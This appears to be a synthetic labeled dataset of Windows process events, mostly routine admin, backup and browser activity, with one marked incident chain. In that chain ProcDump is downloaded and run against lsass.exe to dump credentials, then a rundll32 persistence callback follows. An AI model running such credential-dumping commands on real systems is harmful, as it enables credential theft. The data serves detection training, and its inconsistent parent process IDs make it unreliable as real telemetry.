event_id,_time,host,user,parent_process_name,parent_process_id,process_name,process_id,command_line,signature_status,classification,note
PROC-00137,2026-08-04T13:41:45Z,WEB-EDGE-01,ACME\svc_deploy,explorer.exe,8932,powershell.exe,4097,powershell.exe Get-Service,signed,benign,routine admin
PROC-01293,2026-08-04T13:47:15Z,FILE-01,ACME\svc_backup,chrome.exe,8544,msedgewebview2.exe,5630,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-01121,2026-08-04T13:55:36Z,VULN-SCAN-01,ACME\admin.jlee,taskeng.exe,3389,powershell.exe,12104,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00221,2026-08-04T14:13:53Z,DEPLOY-01,NT AUTHORITY\SYSTEM,explorer.exe,5859,powershell.exe,1517,powershell.exe Get-Service,signed,benign,routine admin
PROC-00268,2026-08-04T14:15:24Z,FILE-01,ACME\admin.rpatel,wsmprovhost.exe,944,powershell.exe,10043,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00870,2026-08-04T14:18:23Z,VULN-SCAN-01,ACME\svc_backup,services.exe,833,backup-agent.exe,4148,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00441,2026-08-04T14:18:28Z,FILE-01,ACME\svc_deploy,services.exe,3116,backup-agent.exe,7797,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00132,2026-08-04T14:21:00Z,WEB-EDGE-01,NT AUTHORITY\SYSTEM,explorer.exe,3687,powershell.exe,4624,powershell.exe Get-Service,signed,benign,routine admin
PROC-00977,2026-08-04T14:21:43Z,APP-API-02,NT AUTHORITY\SYSTEM,wsmprovhost.exe,1652,powershell.exe,8909,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00807,2026-08-04T14:32:58Z,WEB-EDGE-01,ACME\admin.rpatel,services.exe,3013,backup-agent.exe,14543,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01411,2026-08-04T14:39:24Z,ADMIN-WS-11,ACME\admin.rpatel,explorer.exe,2822,powershell.exe,1692,powershell.exe Get-Service,signed,benign,routine admin
PROC-00863,2026-08-04T14:40:19Z,ADMIN-WS-07,ACME\svc_backup,wsmprovhost.exe,4374,powershell.exe,14936,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00893,2026-08-04T14:45:18Z,ADMIN-WS-11,NT AUTHORITY\SYSTEM,chrome.exe,2133,msedgewebview2.exe,2514,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00806,2026-08-04T14:50:49Z,ADMIN-WS-11,NT AUTHORITY\SYSTEM,services.exe,8785,backup-agent.exe,9253,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00787,2026-08-04T15:02:31Z,VULN-SCAN-01,ACME\svc_deploy,taskeng.exe,3775,powershell.exe,12399,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00990,2026-08-04T15:05:34Z,VULN-SCAN-01,ACME\admin.rpatel,explorer.exe,7655,powershell.exe,13469,powershell.exe Get-Service,signed,benign,routine admin
PROC-00057,2026-08-04T15:09:30Z,ADMIN-WS-07,ACME\svc_deploy,chrome.exe,2937,msedgewebview2.exe,14892,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00313,2026-08-04T15:10:32Z,APP-API-02,ACME\svc_deploy,explorer.exe,5671,powershell.exe,8385,powershell.exe Get-Service,signed,benign,routine admin
PROC-00136,2026-08-04T15:16:14Z,FILE-01,ACME\svc_backup,wsmprovhost.exe,8660,powershell.exe,4007,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-INC-001,2026-08-04T15:17:12Z,ADMIN-WS-07,ACME\admin.jlee,explorer.exe,4020,powershell.exe,8420,"powershell.exe -NoProfile -Command ""Start-BitsTransfer https://download.sysinternals.com/tools/ProcDump.zip C:\Users\Public\Documents\diag.zip""",signed,suspicious,User-launched PowerShell downloads from a legitimate domain
PROC-INC-002,2026-08-04T15:17:20Z,ADMIN-WS-07,ACME\admin.jlee,powershell.exe,4020,bitsadmin.exe,8472,bitsadmin.exe /transfer diag https://download.sysinternals.com/tools/ProcDump.zip C:\Users\Public\Documents\diag.zip,signed,suspicious,Alternate transfer utility in same chain
PROC-INC-003,2026-08-04T15:17:44Z,ADMIN-WS-07,ACME\admin.jlee,powershell.exe,4020,powershell.exe,8496,powershell.exe Expand-Archive C:\Users\Public\Documents\diag.zip C:\Users\Public\Documents\diag,signed,suspicious,Archive extraction
PROC-INC-004,2026-08-04T15:18:03Z,ADMIN-WS-07,ACME\admin.jlee,powershell.exe,4020,procdump64.exe,8516,C:\Users\Public\Documents\diag\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\Documents\lsass.dmp,signed,malicious,Signed utility used for credential dumping
PROC-INC-005,2026-08-04T15:21:12Z,ADMIN-WS-07,NT AUTHORITY\SYSTEM,services.exe,4020,rundll32.exe,8620,"rundll32.exe C:\ProgramData\TelemetryCache\telemetry.dll,Start",signed,malicious,Persistence-launched callback
PROC-01286,2026-08-04T15:32:34Z,APP-API-02,ACME\svc_deploy,wsmprovhost.exe,7458,powershell.exe,6768,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00070,2026-08-04T15:33:16Z,WEB-EDGE-01,ACME\admin.jlee,chrome.exe,4273,msedgewebview2.exe,7930,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00971,2026-08-04T15:36:42Z,APP-API-02,ACME\svc_backup,explorer.exe,3205,powershell.exe,5467,powershell.exe Get-Service,signed,benign,routine admin
PROC-00695,2026-08-04T15:37:38Z,VULN-SCAN-01,ACME\admin.jlee,services.exe,8637,backup-agent.exe,5611,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01353,2026-08-04T15:38:36Z,ADMIN-WS-11,NT AUTHORITY\SYSTEM,taskeng.exe,6596,powershell.exe,3515,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00886,2026-08-04T15:40:40Z,ADMIN-WS-11,ACME\admin.rpatel,wsmprovhost.exe,4780,powershell.exe,2954,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-01382,2026-08-04T15:41:08Z,VULN-SCAN-01,ACME\admin.jlee,explorer.exe,7784,powershell.exe,7577,powershell.exe Get-Service,signed,benign,routine admin
PROC-01233,2026-08-04T15:42:45Z,APP-API-02,ACME\svc_deploy,chrome.exe,3103,msedgewebview2.exe,5255,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-01222,2026-08-04T15:43:21Z,APP-API-02,ACME\admin.rpatel,taskeng.exe,1304,powershell.exe,12830,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-01450,2026-08-04T15:43:22Z,ADMIN-WS-07,ACME\admin.rpatel,services.exe,5963,backup-agent.exe,9324,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00970,2026-08-04T16:03:57Z,ADMIN-WS-07,NT AUTHORITY\SYSTEM,wsmprovhost.exe,2322,powershell.exe,6755,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00164,2026-08-04T16:07:26Z,DEPLOY-01,ACME\svc_deploy,wsmprovhost.exe,2838,powershell.exe,4414,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-01223,2026-08-04T16:10:18Z,DEPLOY-01,ACME\admin.jlee,services.exe,5663,backup-agent.exe,13852,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00496,2026-08-04T16:20:50Z,ADMIN-WS-11,ACME\svc_backup,wsmprovhost.exe,7369,powershell.exe,2085,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00409,2026-08-04T16:27:30Z,APP-API-02,ACME\svc_backup,taskeng.exe,6589,powershell.exe,6169,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00148,2026-08-04T16:31:14Z,APP-API-02,ACME\admin.jlee,chrome.exe,6606,msedgewebview2.exe,6500,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-01198,2026-08-04T16:44:17Z,APP-API-02,ACME\svc_deploy,taskeng.exe,8641,powershell.exe,3397,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00647,2026-08-04T16:55:38Z,APP-API-02,ACME\admin.rpatel,chrome.exe,4816,msedgewebview2.exe,5394,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-01410,2026-08-04T16:56:15Z,APP-API-02,ACME\admin.jlee,chrome.exe,5122,msedgewebview2.exe,14605,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00602,2026-08-04T16:56:45Z,ADMIN-WS-07,NT AUTHORITY\SYSTEM,taskeng.exe,6212,powershell.exe,7815,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00314,2026-08-04T16:59:48Z,DEPLOY-01,ACME\svc_backup,services.exe,7459,backup-agent.exe,5436,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01180,2026-08-04T17:09:40Z,APP-API-02,ACME\admin.jlee,chrome.exe,5840,msedgewebview2.exe,3374,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00636,2026-08-04T17:15:44Z,DEPLOY-01,ACME\svc_backup,explorer.exe,8957,powershell.exe,7902,powershell.exe Get-Service,signed,benign,routine admin
PROC-00004,2026-08-04T17:17:08Z,FILE-01,NT AUTHORITY\SYSTEM,chrome.exe,2081,msedgewebview2.exe,11817,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-01287,2026-08-04T17:31:37Z,VULN-SCAN-01,ACME\svc_backup,services.exe,2789,backup-agent.exe,10731,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01002,2026-08-04T17:32:24Z,DEPLOY-01,ACME\svc_deploy,services.exe,4717,backup-agent.exe,4273,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00341,2026-08-04T17:43:07Z,VULN-SCAN-01,ACME\svc_deploy,explorer.exe,4319,powershell.exe,14516,powershell.exe Get-Service,signed,benign,routine admin
PROC-00305,2026-08-04T17:50:40Z,APP-API-02,ACME\admin.jlee,chrome.exe,7795,msedgewebview2.exe,5479,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00488,2026-08-04T17:50:57Z,VULN-SCAN-01,NT AUTHORITY\SYSTEM,services.exe,5939,backup-agent.exe,6106,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00336,2026-08-04T17:56:49Z,DEPLOY-01,ACME\admin.rpatel,taskeng.exe,3564,powershell.exe,4548,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-01480,2026-08-04T18:03:44Z,ADMIN-WS-11,ACME\admin.jlee,chrome.exe,1644,msedgewebview2.exe,7717,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00167,2026-08-04T18:18:57Z,APP-API-02,ACME\svc_deploy,services.exe,8881,backup-agent.exe,14580,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00756,2026-08-04T18:20:43Z,DEPLOY-01,NT AUTHORITY\SYSTEM,services.exe,2401,backup-agent.exe,2154,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01290,2026-08-04T18:24:27Z,VULN-SCAN-01,NT AUTHORITY\SYSTEM,services.exe,593,backup-agent.exe,1608,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00245,2026-08-04T18:32:22Z,DEPLOY-01,ACME\svc_backup,services.exe,5933,backup-agent.exe,4708,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01125,2026-08-04T18:35:15Z,ADMIN-WS-07,ACME\svc_deploy,services.exe,2184,backup-agent.exe,11310,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00106,2026-08-04T18:44:13Z,FILE-01,ACME\admin.jlee,explorer.exe,655,powershell.exe,8932,powershell.exe Get-Service,signed,benign,routine admin
PROC-01017,2026-08-04T19:00:02Z,APP-API-02,NT AUTHORITY\SYSTEM,explorer.exe,4508,powershell.exe,10725,powershell.exe Get-Service,signed,benign,routine admin
PROC-00229,2026-08-04T19:03:12Z,ADMIN-WS-07,ACME\admin.jlee,chrome.exe,346,msedgewebview2.exe,6364,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00198,2026-08-04T19:40:49Z,ADMIN-WS-07,NT AUTHORITY\SYSTEM,explorer.exe,8618,powershell.exe,7460,powershell.exe Get-Service,signed,benign,routine admin
PROC-00362,2026-08-04T19:43:04Z,ADMIN-WS-11,ACME\svc_backup,chrome.exe,4412,msedgewebview2.exe,7353,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00607,2026-08-04T19:44:14Z,ADMIN-WS-11,ACME\admin.rpatel,taskeng.exe,7452,powershell.exe,7694,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00593,2026-08-04T19:44:30Z,APP-API-02,ACME\admin.rpatel,services.exe,7837,backup-agent.exe,14237,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00700,2026-08-04T19:51:45Z,WEB-EDGE-01,ACME\admin.jlee,taskeng.exe,3863,powershell.exe,14867,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00050,2026-08-04T19:58:11Z,ADMIN-WS-07,ACME\admin.rpatel,chrome.exe,7246,msedgewebview2.exe,12390,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00841,2026-08-04T20:00:59Z,ADMIN-WS-07,ACME\svc_deploy,explorer.exe,7984,powershell.exe,5787,powershell.exe Get-Service,signed,benign,routine admin
PROC-00562,2026-08-04T20:06:59Z,VULN-SCAN-01,ACME\admin.rpatel,taskeng.exe,5605,powershell.exe,2488,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00287,2026-08-04T20:07:16Z,ADMIN-WS-07,NT AUTHORITY\SYSTEM,services.exe,2550,backup-agent.exe,13914,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00472,2026-08-04T20:07:40Z,APP-API-02,ACME\svc_deploy,taskeng.exe,6204,powershell.exe,6342,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00366,2026-08-04T20:09:28Z,ADMIN-WS-11,ACME\admin.jlee,explorer.exe,5164,powershell.exe,5363,powershell.exe Get-Service,signed,benign,routine admin
PROC-00549,2026-08-04T20:23:39Z,ADMIN-WS-11,ACME\svc_deploy,explorer.exe,3297,powershell.exe,6578,powershell.exe Get-Service,signed,benign,routine admin
PROC-00060,2026-08-04T20:28:16Z,DEPLOY-01,ACME\admin.rpatel,chrome.exe,4144,msedgewebview2.exe,5238,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-01299,2026-08-04T20:40:41Z,DEPLOY-01,ACME\svc_backup,taskeng.exe,6938,powershell.exe,7094,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-01087,2026-08-04T20:51:13Z,ADMIN-WS-07,ACME\admin.rpatel,taskeng.exe,6788,powershell.exe,12796,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-01456,2026-08-04T20:53:17Z,ADMIN-WS-07,ACME\admin.jlee,explorer.exe,6874,powershell.exe,8346,powershell.exe Get-Service,signed,benign,routine admin
PROC-00960,2026-08-04T20:58:10Z,VULN-SCAN-01,ACME\admin.rpatel,taskeng.exe,1721,powershell.exe,4794,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-01135,2026-08-04T21:05:47Z,ADMIN-WS-11,NT AUTHORITY\SYSTEM,wsmprovhost.exe,6101,powershell.exe,2168,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00527,2026-08-04T21:06:09Z,WEB-EDGE-01,ACME\admin.rpatel,wsmprovhost.exe,5177,powershell.exe,11987,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00669,2026-08-04T21:09:27Z,FILE-01,ACME\svc_deploy,taskeng.exe,1046,powershell.exe,12367,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00798,2026-08-04T21:17:18Z,APP-API-02,ACME\svc_deploy,taskeng.exe,2020,powershell.exe,14195,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-01075,2026-08-04T21:34:54Z,WEB-EDGE-01,ACME\admin.jlee,wsmprovhost.exe,8710,powershell.exe,5398,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00613,2026-08-04T21:36:57Z,ADMIN-WS-07,NT AUTHORITY\SYSTEM,services.exe,5636,backup-agent.exe,11657,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00635,2026-08-04T21:45:26Z,ADMIN-WS-11,ACME\svc_backup,taskeng.exe,2273,powershell.exe,13560,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00738,2026-08-04T21:58:50Z,DEPLOY-01,ACME\svc_backup,chrome.exe,2565,msedgewebview2.exe,7960,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-01231,2026-08-04T22:03:39Z,ADMIN-WS-07,NT AUTHORITY\SYSTEM,services.exe,2485,backup-agent.exe,1572,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01094,2026-08-04T22:04:56Z,ADMIN-WS-07,ACME\admin.rpatel,wsmprovhost.exe,8597,powershell.exe,13293,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00734,2026-08-04T22:06:25Z,VULN-SCAN-01,ACME\admin.rpatel,chrome.exe,6115,msedgewebview2.exe,1790,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00111,2026-08-04T22:07:51Z,ADMIN-WS-07,ACME\svc_deploy,taskeng.exe,7691,powershell.exe,12938,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00081,2026-08-04T22:09:08Z,DEPLOY-01,ACME\admin.jlee,wsmprovhost.exe,3150,powershell.exe,12315,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00939,2026-08-04T22:12:22Z,ADMIN-WS-11,ACME\svc_backup,services.exe,893,backup-agent.exe,9903,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00223,2026-08-04T22:19:36Z,APP-API-02,ACME\admin.rpatel,wsmprovhost.exe,5605,powershell.exe,11764,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-01155,2026-08-04T22:20:04Z,ADMIN-WS-11,ACME\admin.jlee,wsmprovhost.exe,1354,powershell.exe,10261,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00773,2026-08-04T22:20:17Z,ADMIN-WS-11,NT AUTHORITY\SYSTEM,services.exe,597,backup-agent.exe,3928,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00150,2026-08-04T22:22:43Z,VULN-SCAN-01,ACME\svc_deploy,wsmprovhost.exe,4085,powershell.exe,12538,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00567,2026-08-04T22:25:45Z,FILE-01,NT AUTHORITY\SYSTEM,wsmprovhost.exe,6464,powershell.exe,11148,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00264,2026-08-04T22:30:41Z,APP-API-02,ACME\admin.rpatel,chrome.exe,503,msedgewebview2.exe,10409,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00483,2026-08-04T22:31:48Z,APP-API-02,NT AUTHORITY\SYSTEM,chrome.exe,6714,msedgewebview2.exe,4414,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00020,2026-08-04T22:33:13Z,WEB-EDGE-01,ACME\admin.rpatel,chrome.exe,2305,msedgewebview2.exe,11626,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00400,2026-08-04T22:35:04Z,APP-API-02,ACME\admin.jlee,explorer.exe,6192,powershell.exe,8017,powershell.exe Get-Service,signed,benign,routine admin
PROC-01260,2026-08-04T22:51:12Z,FILE-01,NT AUTHORITY\SYSTEM,wsmprovhost.exe,4919,powershell.exe,1922,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00276,2026-08-04T22:56:15Z,APP-API-02,ACME\admin.jlee,services.exe,5927,backup-agent.exe,8211,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01167,2026-08-04T23:24:03Z,DEPLOY-01,ACME\admin.jlee,services.exe,653,backup-agent.exe,4601,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01492,2026-08-04T23:24:57Z,APP-API-02,NT AUTHORITY\SYSTEM,chrome.exe,7312,msedgewebview2.exe,12180,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00214,2026-08-04T23:33:39Z,FILE-01,ACME\svc_backup,explorer.exe,5199,powershell.exe,10939,powershell.exe Get-Service,signed,benign,routine admin
PROC-00523,2026-08-04T23:35:31Z,FILE-01,ACME\admin.jlee,chrome.exe,2512,msedgewebview2.exe,11846,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-00840,2026-08-04T23:40:32Z,APP-API-02,ACME\svc_deploy,chrome.exe,5382,msedgewebview2.exe,12450,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
PROC-01482,2026-08-04T23:43:21Z,ADMIN-WS-07,ACME\svc_backup,wsmprovhost.exe,3968,powershell.exe,6319,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00319,2026-08-04T23:54:21Z,WEB-EDGE-01,NT AUTHORITY\SYSTEM,services.exe,3306,backup-agent.exe,3615,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01317,2026-08-05T00:04:47Z,DEPLOY-01,ACME\admin.rpatel,services.exe,4232,backup-agent.exe,2530,backup-agent.exe --run,signed,benign,scheduled backup
PROC-00143,2026-08-05T00:07:39Z,ADMIN-WS-11,ACME\admin.rpatel,wsmprovhost.exe,7364,powershell.exe,7491,powershell.exe -File C:\Deploy\Install-Agent.ps1,signed,benign,approved deployment
PROC-00551,2026-08-05T00:12:58Z,WEB-EDGE-01,ACME\svc_backup,services.exe,3633,backup-agent.exe,11216,backup-agent.exe --run,signed,benign,scheduled backup
PROC-01077,2026-08-05T00:24:18Z,FILE-01,ACME\admin.jlee,taskeng.exe,6214,powershell.exe,8857,powershell.exe -File C:\Ops\Rotate-Logs.ps1,signed,benign,routine maintenance
PROC-00160,2026-08-05T00:27:18Z,WEB-EDGE-01,ACME\admin.jlee,chrome.exe,1815,msedgewebview2.exe,8719,msedgewebview2.exe --utility-sub-type=network,signed,benign,normal browser activity
